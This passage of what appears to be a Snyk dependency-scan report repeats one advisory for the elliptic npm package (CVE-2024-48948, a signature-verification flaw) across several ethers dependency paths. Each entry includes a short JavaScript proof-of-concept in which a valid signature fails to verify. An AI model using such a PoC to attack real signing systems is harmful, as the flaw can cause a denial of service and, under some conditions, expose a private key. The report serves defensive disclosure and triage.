        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/json-wallets@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/providers@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/wallet@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/wallet@5.8.0",
